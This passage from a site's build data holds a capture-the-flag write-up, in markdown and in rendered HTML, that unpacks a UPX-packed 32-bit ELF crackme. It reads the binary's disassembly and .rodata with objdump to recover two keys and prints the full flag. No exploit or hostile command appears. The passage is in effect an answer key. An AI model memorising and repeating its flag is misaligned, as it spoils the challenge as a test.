`0x806a03d`\r\n- `0x806a03f`\r\n- `0x806a041`\r\n- `0x806a043`\r\n- `0x806a045`\r\n\r\nEach address is followed by length 1, suggesting single character strings.\r\n\r\n```bash\r\n$ objdump -s --start-address=0x806a014 --stop-address=0x806a050 './flag{key1+key2}'\r\n```\r\n\r\nOutput:\r\n```\r\n./flag{key1+key2}:     file format elf32-i386\r\n\r\nContents of section .rodata:\r\n 806a014 596f7520 646f6e27 74206861 76652074  You don't have t\r\n 806a024 68652066 69727374 20706172 74206f66  he first part of\r\n 806a034 206b6579 20796574 004a004b 004c0071   key yet.J.K.L.q\r\n 806a044 00350039 00550031 00330037           .5.9.U.1.3.7\r\n```\r\n\r\nCharacter mapping:\r\n```\r\nOffset   Hex     ASCII   Character\r\n------   -----   -----   ---------\r\n806a03d  4a 00   J \\0    'J'\r\n806a03f  4b 00   K \\0    'K'\r\n806a041  4c 00   L \\0    'L'\r\n806a043  71 00   q \\0    'q'\r\n806a045  35 00   5 \\0    '5'\r\n```\r\n\r\nThe code references only the first 5 addresses, so:\r\n\r\n**KEY2 = \"JKLq5\"**\r\n\r\n## Solution\r\n\r\n### Final Keys\r\n- KEY1: `456789`\r\n- KEY2: `JKLq5`\r\n\r\n### Flag Format\r\nThe challenge filename is `flag{key1+key2}`, which means:\r\n\r\n```\r\nflag{456789+JKLq5}\r\n```","src/content/blog/strings-dont-lie-packers-do.md","cd44af1d75a07814",{"html":324,"metadata":325},"\u003Cp>\u003Cem>Note - always check for UPX, wasted half an hour because i didnt unpack the binary\u003C/em>\u003C/p>\n\u003Ch2 id=\"binary-analysis\">Binary Analysis\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> file\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> './flag{key1+key2}'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">./flag\u003C/span>\u003Cspan style=\"color:#9ECBFF\">{key1+key2}\u003C/span>\u003Cspan style=\"color:#79B8FF\">:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ELF\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 32-bit\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> LSB\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> executable,\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Intel\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 80386,\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> version\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (SYSV),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">dynamically\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> linked,\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> interpreter\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> /lib/ld-linux.so.2,\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> for\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> GNU/Linux\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 2.6.32,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">BuildID[sha1]\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\">77c06ef6af332d2e5def19f42f2b60fcf2c5d2e6,\u003C/span>\u003Cspan style=\"color:#B392F0\"> not\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> stripped\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Key observations:\u003C/p>\n\u003Cul>\n\u003Cli>32-bit ELF binary\u003C/li>\n\u003Cli>Dynamically linked (requires 32-bit libraries)\u003C/li>\n\u003Cli>Not stripped (symbols intact - easier to analyze)\u003C/li>\n\u003C/ul>\n\u003Ch2 id=\"initial-execution\">Initial Execution\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ./flag{key1+key2}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[No output]\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The binary runs but produces no output. Maybe the key is in the binary itself?\u003C/p>\n\u003Ch2 id=\"detecting-the-packer\">Detecting the Packer\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> strings\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> './flag{key1+key2}'\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> grep\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -i\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> upx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">$Info: This file is packed with the UPX executable packer http://upx.sf.net $\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">$Id: UPX 3.91 Copyright (\u003C/span>\u003Cspan style=\"color:#B392F0\">C\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) 1996-2013 the UPX Team. All Rights Reserved. $\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">PROT_EXEC\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003Cspan style=\"color:#B392F0\">PROT_WRITE\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> failed.\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The binary is packed with UPX (Ultimate Packer for eXecutables) version 3.91.\u003C/p>\n\u003Ch2 id=\"unpacking-with-upx\">Unpacking with UPX\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> upx\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -d\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> './flag{key1+key2}'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                       Ultimate\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Packer\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> for\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> eXecutables\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                          Copyright\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (C) 1996 - 2025\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">UPX\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 5.0.2\u003C/span>\u003Cspan style=\"color:#9ECBFF\">       Markus\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Oberhumer,\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Laszlo\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Molnar\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> &#x26; \u003C/span>\u003Cspan style=\"color:#B392F0\">John\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Reiser\u003C/span>\u003Cspan style=\"color:#9ECBFF\">   Jul\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 20th\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 2025\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        File\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> size\u003C/span>\u003Cspan style=\"color:#9ECBFF\">         Ratio\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      Format\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      Name\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">   --------------------\u003C/span>\u003Cspan style=\"color:#79B8FF\">   ------\u003C/span>\u003Cspan style=\"color:#79B8FF\">   -----------\u003C/span>\u003Cspan style=\"color:#79B8FF\">   -----------\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[WARNING] bad b_info at 0x12948\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[WARNING] ... recovery at 0x12944\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    194808\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x3C;\u003C/span>\u003Cspan style=\"color:#9ECBFF\">-\u003C/span>\u003Cspan style=\"color:#79B8FF\">     85996\u003C/span>\u003Cspan style=\"color:#9ECBFF\">   44.14%\u003C/span>\u003Cspan style=\"color:#9ECBFF\">   linux/i386\u003C/span>\u003Cspan style=\"color:#9ECBFF\">    flag{key1+key2}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Unpacked\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> file.\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"searching-for-key-related-strings\">Searching for Key-Related Strings\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> strings\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> './flag{key1+key2}'\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> grep\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -i\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> key\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">You\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> don't have the first part of key yet\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">You dont have the entire key yet.... :(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">keyjoin.12717834333337631731.tmp.c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">mapnode_find_key\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">map_key_to_index\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">mapnode_subkeys\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">map_keys_1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">SortedMap_keys\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">mapnode_remove_key\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">DenseArray_key\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">map_keys\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Important strings:\u003C/p>\n\u003Col>\n\u003Cli>\u003Ccode>\"You don't have the first part of key yet\"\u003C/code>\u003C/li>\n\u003Cli>\u003Ccode>\"You dont have the entire key yet.... :(\"\u003C/code>\u003C/li>\n\u003C/ol>\n\u003Cp>These error messages indicate the binary checks for keys and displays messages when conditions aren’t met.\u003C/p>\n\u003Ch2 id=\"main-function-analysis\">Main Function Analysis\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> objdump\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -d\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -M\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> intel\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> './flag{key1+key2}'\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> grep\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -A\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 50\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"&#x3C;main>:\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Output:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>08068f89 &#x3C;main>:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068f89:\t8d 4c 24 04          \tlea    ecx,[esp+0x4]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068f8d:\t83 e4 f0             \tand    esp,0xfffffff0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068f90:\tff 71 fc             \tpush   DWORD PTR [ecx-0x4]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068f93:\t55                   \tpush   ebp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068f94:\t89 e5                \tmov    ebp,esp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068f96:\t51                   \tpush   ecx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068f97:\t83 ec 04             \tsub    esp,0x4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068f9a:\t89 c8                \tmov    eax,ecx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068f9c:\t83 ec 08             \tsub    esp,0x8\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068f9f:\tff 70 04             \tpush   DWORD PTR [eax+0x4]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068fa2:\tff 30                \tpush   DWORD PTR [eax]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068fa4:\te8 f3 93 ff ff       \tcall   806239c &#x3C;_vinit>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068fa9:\t83 c4 10             \tadd    esp,0x10\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068fac:\te8 cb 8f ff ff       \tcall   8061f7c &#x3C;main__main>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068fb1:\tb8 00 00 00 00       \tmov    eax,0x0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068fb6:\t8b 4d fc             \tmov    ecx,DWORD PTR [ebp-0x4]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068fb9:\tc9                   \tleave\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068fba:\t8d 61 fc             \tlea    esp,[ecx-0x4]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8068fbd:\tc3                   \tret\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cul>\n\u003Cli>\u003Ccode>main\u003C/code> calls \u003Ccode>_vinit\u003C/code> for initialization\u003C/li>\n\u003Cli>Then calls \u003Ccode>main__main\u003C/code> at address \u003Ccode>0x8061f7c\u003C/code>\u003C/li>\n\u003Cli>Returns 0\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"analyzing-main__main\">Analyzing main__main\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> objdump\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -d\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -M\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> intel\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> './flag{key1+key2}'\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> grep\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -A\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 50\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"8061f7c &#x3C;main__main>:\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Key sections:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>08061f7c &#x3C;main__main>:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8061f82:\tc7 45 d8 17 00 00 00 \tmov    DWORD PTR [ebp-0x28],0x17\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8061f89:\tc7 45 dc 8c 09 00 00 \tmov    DWORD PTR [ebp-0x24],0x98c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8061f90:\t83 7d d8 2d          \tcmp    DWORD PTR [ebp-0x28],0x2d\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8061f94:\t75 07                \tjne    8061f9d &#x3C;main__main+0x21>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8061f96:\te8 64 00 00 00       \tcall   8061fff &#x3C;main__one>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8061f9b:\teb 29                \tjmp    8061fc6 &#x3C;main__main+0x4a>\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Summary:\u003C/p>\n\u003Cul>\n\u003Cli>Line \u003Ccode>8061f82\u003C/code>: Stores value \u003Ccode>0x17\u003C/code> (decimal 23) in local variable\u003C/li>\n\u003Cli>Line \u003Ccode>8061f89\u003C/code>: Stores value \u003Ccode>0x98c\u003C/code> (decimal 2444) in local variable\u003C/li>\n\u003Cli>Line \u003Ccode>8061f90\u003C/code>: Compares first value with \u003Ccode>0x2d\u003C/code> (decimal 45)\u003C/li>\n\u003Cli>Since 23 ≠ 45, the jump at \u003Ccode>8061f94\u003C/code> is taken\u003C/li>\n\u003Cli>Line \u003Ccode>8061f96\u003C/code>: This call is SKIPPED because the comparison failed\u003C/li>\n\u003C/ul>\n\u003Cp>The binary intentionally prevents the key functions from being called by using incorrect comparison values.\u003C/p>\n\u003Ch2 id=\"key-1-analyzing-main__one\">KEY 1: Analyzing main__one\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> objdump\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -d\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -M\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> intel\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> './flag{key1+key2}'\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> grep\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -A\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 150\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"8061fff &#x3C;main__one>:\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Key sections:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>08061fff &#x3C;main__one>:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8062030:\tc7 45 a8 2d 00 00 00 \tmov    DWORD PTR [ebp-0x58],0x2d\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8062037:\t83 7d a8 1f          \tcmp    DWORD PTR [ebp-0x58],0x1f\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 806203b:\t0f 8f 93 00 00 00    \tjg     80620d4 &#x3C;main__one+0xd5>\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Loop analysis:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan> 8062058:\tc7 45 a4 02 00 00 00 \tmov    DWORD PTR [ebp-0x5c],0x2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 806207e:\t83 7d a4 0b          \tcmp    DWORD PTR [ebp-0x5c],0xb\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 8062082:\t7e dd                \tjle    8062061 &#x3C;main__one+0x62>\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cul>\n\u003Cli>Initialize counter to 2\u003C/li>\n\u003Cli>Push counter value to array\u003C/li>\n\u003Cli>Increment counter by 1\u003C/li>\n\u003Cli>Compare counter with 0xb (11)\u003C/li>\n\u003Cli>If counter ≤ 11, loop\u003C/li>\n\u003C/ul>\n\u003Cp>Result: Creates array \u003Ccode>[2, 3, 4, 5, 6, 7, 8, 9, 10, 11]\u003C/code>\u003C/p>\n\u003Cp>Then:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan> 806208a:\t6a 08                \tpush   0x8\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 806208c:\t6a 02                \tpush   0x2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 806209b:\te8 d0 43 ff ff       \tcall   8056470 &#x3C;array_slice>\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Call: \u003Ccode>array_slice(array, 2, 8)\u003C/code>\u003C/p>\n\u003Cp>Result: Slices array from index 2 to 8 → \u003Ccode>[4, 5, 6, 7, 8, 9]\u003C/code>\u003C/p>\n\u003Cp>\u003Cstrong>KEY1 = “456789”\u003C/strong>\u003C/p>\n\u003Ch2 id=\"key-2-analyzing-main__two\">KEY 2: Analyzing main__two\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> objdump\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -d\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -M\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> intel\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> './flag{key1+key2}'\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> grep\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -A\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 250\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"8062131 &#x3C;main__two>:\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Memory addresses loaded:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ccode>0x806a03d\u003C/code>\u003C/li>\n\u003Cli>\u003Ccode>0x806a03f\u003C/code>\u003C/li>\n\u003Cli>\u003Ccode>0x806a041\u003C/code>\u003C/li>\n\u003Cli>\u003Ccode>0x806a043\u003C/code>\u003C/li>\n\u003Cli>\u003Ccode>0x806a045\u003C/code>\u003C/li>\n\u003C/ul>\n\u003Cp>Each address is followed by length 1, suggesting single character strings.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> objdump\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -s\u003C/span>\u003Cspan style=\"color:#79B8FF\"> --start-address=0x806a014\u003C/span>\u003Cspan style=\"color:#79B8FF\"> --stop-address=0x806a050\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> './flag{key1+key2}'\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Output:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>./flag{key1+key2}:     file format elf32-i386\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Contents of section .rodata:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 806a014 596f7520 646f6e27 74206861 76652074  You don't have t\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 806a024 68652066 69727374 20706172 74206f66  he first part of\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 806a034 206b6579 20796574 004a004b 004c0071   key yet.J.K.L.q\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 806a044 00350039 00550031 00330037           .5.9.U.1.3.7\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Character mapping:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Offset   Hex     ASCII   Character\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>------   -----   -----   ---------\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>806a03d  4a 00   J \\0    'J'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>806a03f  4b 00   K \\0    'K'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>806a041  4c 00   L \\0    'L'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>806a043  71 00   q \\0    'q'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>806a045  35 00   5 \\0    '5'\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The code references only the first 5 addresses, so:\u003C/p>\n\u003Cp>\u003Cstrong>KEY2 = “JKLq5”\u003C/strong>\u003C/p>\n\u003Ch2 id=\"solution\">Solution\u003C/h2>\n\u003Ch3 id=\"final-keys\">Final Keys\u003C/h3>\n\u003Cul>\n\u003Cli>KEY1: \u003Ccode>456789\u003C/code>\u003C/li>\n\u003Cli>KEY2: \u003Ccode>JKLq5\u003C/code>\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"flag-format\">Flag Format\u003C/h3>\n\u003Cp>The challenge filename is \u003Ccode>flag{key1+key2}\u003C/code>, which means:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>flag{456789+JKLq5}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>",{"headings":326,"localImagePaths":363,"remoteImagePaths":364,"frontmatter":365,"imagePaths":366},[327,330,333,336,339,342,345,348,351,354,357,360],{"depth":27,"slug":328,"text":329},"binary-analysis","Binary Analysis",{"depth":27,"slug":331,"text":332},"initial-execution","Initial Execution",{"depth":27,"slug":334,"text":335},"detecting-the-packer","Detecting the Packer",{"depth":27,"slug":337,"text":338},"unpacking-with-upx","Unpacking with UPX",{"depth":27,"slug":340,"text":341},"searching-for-key-related-strings","Searching for Key-Related Strings",{"depth":27,"slug":343,"text":344},"main-function-analysis","Main Function 